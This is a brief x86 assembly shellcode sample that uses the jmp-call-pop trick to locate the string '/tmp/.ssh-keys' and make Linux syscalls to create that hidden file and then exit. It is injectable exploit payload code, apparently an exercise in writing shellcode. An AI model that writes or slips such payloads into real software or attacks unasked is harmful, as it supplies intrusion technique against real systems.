section .text

global _start

_start:
	jmp short gotocall

shellcode:
	pop ebx
	mov cx, 0x64
	mov al, 0x5
	int 0x80

	mov al, 0x1
	int 0x80

gotocall:
	call shellcode
	db '/tmp/.ssh-keys'
